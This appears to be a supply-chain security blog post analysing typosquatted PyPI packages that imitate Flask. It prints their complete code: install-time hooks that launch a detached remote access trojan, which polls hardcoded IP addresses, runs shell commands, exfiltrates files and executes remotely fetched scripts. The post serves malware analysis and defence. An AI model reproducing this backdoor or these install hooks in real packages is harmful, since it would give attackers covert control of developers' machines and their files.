@@ -1,0 +1,329 @@
+
+On the morning of May 10, 2023, Phylum’s automated risk detection platform flagged a series of publications surrounding the popular Flask package on PyPI. After reaching out to the author, we discovered that they were actually white hat publications intended for educational and demonstration purposes. However, this discovery serves as a crucial reminder that manual code review alone of seemingly innocuous packages is not sufficient to ensure security. Attackers can inject malware throughout the entire supply chain, including package dependencies.
+
+A Few Test Publications
+This began with the publication of the package flaaks2. Over a span of approximately 15 minutes and the release of three different versions, we can observe the author's experimentation with utilizing Python's cmdclass attribute in the setup file to execute two other functions in separate scripts.
+Below is the setup.py file from flaaks version 0.2. While we won't delve into extensive details about this version since the author shifted tactics in version 0.3, it's important to note that the ultimate objective is to execute the configure_package() function from background_task and the run() function from post_install.
+from setuptools import setup
+from setuptools.command.install import install
+
+class CustomInstall(install):
+    def run(self):
+        install.run(self)  # Run the original install command
+
+        # Add your custom installation steps here
+        print("Running background_task...")
+        from flaaks.background_task import configure_package
+        configure_package()
+
+        print("Running post_install...")
+        from flaaks.post_install import run
+        run()
+
+setup(
+    name='flaaks2',
+    version='0.2',
+    license='MIT',
+    author="",
+    author_email='',
+    packages=['flaaks'],
+    keywords='example project',
+    install_requires=[
+        'requests',
+    ],
+    cmdclass={
+        'install': CustomInstall,
+    },
+    entry_points={
+        'console_scripts': [
+            'background_task=flaaks.background_task:configure_package',
+            'post_install=flaaks.post_install:run',
+        ]
+    }
+)
+setup.py
+flaaks2
+Let's examine the scripts that the author is attempting to execute. It's worth noting that although both scripts belong to version 0.2, their content remains consistent throughout all three versions. Only the setup file and the top-level init file undergo changes as the author conducts their experiments. Below is the content of the background_task.py file.
+import requests
+import threading
+import json
+import subprocess
+import importlib.util
+import base64
+import ctypes
+import sys
+import time
+import os
+
+
+def configure_package():
+    print("hi")
+    SERVER_URL = "http://139.177.181.203:80"
+    GITDEMO_URL = "https://raw.githubusercontent.com/username/repo/master/gitdemo.py"
+    SLEEP_TIME = 0.5
+
+    def create_hidden_terminal():
+        terminal_process = subprocess.Popen(["bash"],
+                                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                            universal_newlines=True)
+        return terminal_process
+
+    def execute_command(terminal_process, command):
+        terminal_process.stdin.write(f"{command}\n")
+        terminal_process.stdin.write("echo 'END-OF-COMMAND'\n")
+        terminal_process.stdin.flush()
+
+        output = []
+        while True:
+            line = terminal_process.stdout.readline()
+            if not line:
+                break
+            if line.strip() == "END-OF-COMMAND":
+                break
+            output.append(line.strip())
+
+        return '\n'.join(output)
+
+    def process_command(terminal_process, command):
+        if command == "exit":
+            terminal_process.terminate()
+            return
+        elif command.startswith("download"):
+            local_file_path = command.split(" ")[2]
+            remote_file_path = command.split(" ")[1]
+            with open(local_file_path, "rb") as file:
+                data = file.read()
+            encoded_data = base64.b64encode(data).decode('utf-8')
+            response = requests.post(
+                f"{SERVER_URL}/download/{remote_file_path}", data=encoded_data.encode())
+        elif command.startswith("upload"):
+            local_file_path = command.split(" ")[1]
+            remote_file_path = command.split(" ")[2]
+            response = requests.get(
+                f"{SERVER_URL}/upload/{local_file_path}")
+            decoded_data = base64.b64decode(response.text)
+            with open(remote_file_path, "wb") as file:
+                file.write(decoded_data)
+            print(f"Uploaded {local_file_path} to {remote_file_path}")
+        elif command.startswith("cd"):
+            os.chdir(command.split(" ")[1])
+        elif command.startswith("gitdemo"):
+            response = requests.get(GITDEMO_URL)
+            script_code = response.content.decode('utf-8')
+            spec = importlib.util.spec_from_loader("gitdemo", loader=None)
+            module = importlib.util.module_from_spec(spec)
+            exec(script_code, module.__dict__)
+            module.main()
+        else:
+            result = execute_command(terminal_process, command)
+            response = requests.post(SERVER_URL, data=result)
+
+    def main():
+        terminal_process = create_hidden_terminal()
+
+        while True:
+            try:
+                response = requests.get(SERVER_URL)
+                command = response.text.strip()
+
+                command_thread = threading.Thread(
+                    target=process_command, args=(terminal_process, command))
+                command_thread.start()
+                command_thread.join()
+
+            except (requests.exceptions.RequestException, requests.exceptions.Timeout):
+                print("Connection error, retrying in 30 seconds")
+                time.sleep(SLEEP_TIME)
+            except ConnectionResetError:
+                print("Connection dropped, retrying in 30 seconds")
+                time.sleep(SLEEP_TIME)
+            except Exception as e:
+                print(f"Unknown error: {e}")
+                time.sleep(SLEEP_TIME)
+
+            time.sleep(SLEEP_TIME)
+
+
+if __name__ == "__main__":
+    configure_package()
+background_task.py
+The script above facilitates remote command execution on a server by establishing a concealed terminal process and employing HTTP requests for server communication. It operates by monitoring incoming commands, executing them within the terminal process, and sending back the output to the server. Furthermore, it includes functionalities such as file downloading and uploading, directory manipulation, and the execution of scripts hosted on GitHub, although the provided URL presently directs to a placeholder. To handle multiple commands concurrently, the script utilizes threading and incorporates error handling mechanisms for common issues like connection timeouts and drops. Overall, its characteristics suggest that it serves as a basic Remote Access Trojan (RAT).
+Now let's take a look at the post_install script.
+import os
+import subprocess
+import sys
+
+
+def run():
+    print("hi")
+    script_path = os.path.abspath(sys.argv[0])
+    cmd = f"nohup python {script_path} > /dev/null 2>&1 &"
+    subprocess.Popen(cmd, shell=True)
+
+
+if __name__ == "__main__":
+    run()
+post_install.py
+The script above executes another Python script as a background process on a Unix-like system. The function creates a subprocess using the subprocess module, which runs the specified Python script using the nohup command. By utilizing nohup, the script continues running in the background even after the user logs out or closes the terminal. To ensure stealthiness, the script's output is redirected to /dev/null, thereby preventing the victim from observing any output or becoming suspicious of any ongoing processes.
+In version 0.3, the author removed the cmdclass from the setup file and instead added the following to the top-level __init__.py file, as shown below.
+import atexit
+
+def _post_install():
+    print("Running background_task...")
+    from .background_task import configure_package
+    configure_package()
+
+    print("Running post_install...")
+    from .post_install import run
+    run()
+
+atexit.register(_post_install)
+__init__.py
+The script above registers a function named _post_install() with atexit to execute automatically when the Python interpreter is closed. This function, in turn, calls two other functions, configure_package() and run(), which are imported from the previously mentioned files. Since this code resides in the top-level __init__.py file, the _post_install() function is registered and executed only when the Python interpreter exits from a script that imports this package. However, it is worth noting that no other packages in PyPI are importing flaaks2, indicating that this may have been a test or proof-of-concept.
+Depending on a Malicious Package
+Interestingly, in the timeline provided below, it can be observed that after the publication of the three versions of flaaks2, two packages named flaks and flaks-setup were released almost simultaneously. Over the next three hours, a total of 12 versions of flaks and 16 versions of flaks-setup were published. Let's now examine those packages.
+For brevity, we will skip analyzing the version-to-version differences for each package and focus on the most recent versions. Provided below is the setup.py file for flaks version 1.2:
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+
+class PostInstallCommand(install):
+    def run(self):
+        install.run(self)
+        import flaks_setup
+        flaks_setup.post_install()
+
+
+setup(
+    name='flaks',
+    version='1.2',
+    license='MIT',
+    author="",
+    author_email='',
+    packages=find_packages('src'),
+    package_dir={'': 'src'},
+    url='',
+    keywords='',
+    install_requires=[
+        'requests',
+        'flaks_setup==1.2'
+    ],
+    cmdclass={
+        'install': PostInstallCommand
+    }
+)
+flaks
+The first thing we notice above is that both requests and flaks_setup are required dependencies for the flaks package. Therefore, installing flaks will automatically attempt to install these dependencies. Additionally, the author of this package chose to utilize the cmdclass, which triggers the execution of the run() function within the PostInstallCommand class after the installation of the flaks package. In this case, the run() function imports flaks_setup and then executes its post_install() function. This represents the entirety of the flaks package, so now let's shift our focus to flaks_setup.
+To begin, let's examine the setup.py file since the installation of flaks will also trigger the installation of flaks_setup. Here is the contents of the setup file:
+from setuptools import setup, find_packages
+
+setup(
+    name='flaks_setup',
+    version='1.2',
+    license='MIT',
+    author="",
+    author_email='',
+    packages=find_packages('src'),
+    package_dir={'': 'src'},
+    url='',
+    keywords='',
+    install_requires=[
+        'requests',
+    ]
+)
+flaks_setup
+There doesn't appear to be anything nefarious in this section. However, it's important to remember that once the installation is triggered by flaks, the package is subsequently imported in the PostInstallCommand so let's examine the __init__.py file to see what happens there.
+import requests
+import os
+import subprocess
+import sys
+
+def execute():
+    HOST = "http://46.101.114.247:80"
+    current_dir = os.getcwd()
+    while True:
+        req = requests.get(f'{HOST}')
+        command = req.text
+        if 'exit' in command:
+            break
+        elif 'grab' in command:
+            grab, path, filename = command.split(" ")
+            print(grab, path, filename)
+            if os.path.exists(path):
+                url = f"{HOST}/store"
+                files = {'file': (filename, open(path, 'rb'))}
+                r = requests.post(url, files=files)
+            else:
+                post_response = requests.post(
+                    url=f'{HOST}', data='[-] Not able to find the file!'.encode())
+        elif 'cd' in command:
+            code, path = command.split(' ')
+            try:
+                os.chdir(path)
+                current_dir = os.getcwd()
+                post_response = requests.post(
+                    url=f'{HOST}', data=current_dir.encode())
+            except FileNotFoundError as e:
+                post_response = requests.post(
+                    url=f'{HOST}', data=str(e).encode())
+
+        else:
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
+            post_response = requests.post(
+                url=f'{HOST}', data=CMD.stdout.read())
+            post_response = requests.post(
+                url=f'{HOST}', data=CMD.stderr.read())
+            
+def post_install():
+    pid = os.fork()
+    if pid == 0:  # This is the child process
+        os.setsid()  # Create a new session for the child process
+        execute()
+        sys.exit(0)
+Well this looks familiar! It bears a striking resemblance to the background_task.py file we encountered earlier in flaaks2. However, there are a few distinctions between them. Here, we find two functions: execute() and post_install(). The execute() function serves as a refactored version of configure_package(), establishing a backdoor for remote control of a machine. It sets up a loop that listens for incoming commands from a remote server (IP 46.101.114.247, located within the Digital Ocean address range in Germany). Communication with the server occurs through HTTP requests, where commands are received and executed, with the output returned. Available commands include changing the current directory, retrieving and uploading files to the server, and executing shell commands. If the command is 'exit', the loop is terminated, severing the connection with the server.
+As a reminder, the PostInstallCommand from the flaks installation imports and executes the post_install() command from this package. The post_install() function forks the current process, creates a new session for the child process, and invokes the execute() function. This ensures that the script continues to run even after the user logs out.
+Let's Recap
+The initial attack vector here is typosquatting and once a victim accidentally performs a pip install flaks (instead of pip install flask) it triggers the following sequence of events:
+
+The install_requires keyword within the setup() command in flaks's setup.py initiates the installation of the flaks_setup package.
+Following the installation of flaks_setup, a PostInstallCommand in flaks's setup.py imports the newly installed flaks_setup package and invokes the post_install() command from it.
+Consequently, post_install() launches execute() within a child process, which patiently awaits commands from the remote server, establishing the rudimentary RAT.
+Upon discovering these packages, we promptly reported them to PyPI, resulting in their swift removal. Furthermore, we contacted the package author, who diligently responded and acknowledged the publications and shared the following information with us:
+Conclusion
+Although the attack we discussed above turned out to be a false alarm, it emphasizes the challenges and significance of software supply-chain security. The complex nature of software dependencies and versioning provides attackers with numerous opportunities to slip in malicious code, whether as a direct or transitive dependency buried deep within the vast network. We've previously written about the intricate web of dependencies in a package, and if you've never considered the interconnectedness of open-source ecosystems, I highly recommend reading Hidden Dependencies Lurking in the Software Dependency Network.
+The initial typosquatting attack vector discussed here highlights the obvious trigger for this particular attack chain - a simple typing mistake or fat finger error. However, a common question arises around strangely named malware publications: "Why would someone install a package named onyxproxy? I would never accidentally type that!" In a fantastic blog post called Bad Beat Poetry authored by our own Charles Coggins, this very question is addressed.
+Publication Timeline
+
+Package Name	Publication Time
+flaaks2@0.1	2023-05-10 08:32
+flaaks2@0.2	2023-05-10 08:41
+flaaks2@0.3	2023-05-10 08:46
+flaks@0.1	2023-05-10 11:08
+flaks-setup@0.1	2023-05-10 11:11
+flaks-setup@0.2	2023-05-10 11:15
+flaks-setup@0.3	2023-05-10 11:16
+flaks@0.2	2023-05-10 11:21
+flaks@0.3	2023-05-10 11:22
+flaks-setup@0.5	2023-05-10 11:25
+flaks@0.4	2023-05-10 11:26
+flaks-setup@0.6	2023-05-10 11:56
+flaks@0.5	2023-05-10 11:57
+flaks@0.6	2023-05-10 12:53
+flaks-setup@0.7	2023-05-10 12:53
+flaks-setup@0.8	2023-05-10 13:01
+flaks-setup@0.9	2023-05-10 13:07
+flaks-setup@0.91	2023-05-10 13:08
+flaks-setup@0.92	2023-05-10 13:22
+flaks@0.7	2023-05-10 13:23
+flaks@0.8	2023-05-10 13:34
+flaks-setup@0.93	2023-05-10 13:34
+flaks@0.9	2023-05-10 13:45
+flaks-setup@0.94	2023-05-10 13:45
+flaks-setup@0.95	2023-05-10 13:59
+flaks@1.0	2023-05-10 14:00
+flaks-setup@1.0	2023-05-10 14:03
+flaks-setup@1.1	2023-05-10 14:12
+flaks@1.1	2023-05-10 14:13
+flaks-setup@1.2	2023-05-10 14:18
+flaks@1.2	2023-05-10 14:19
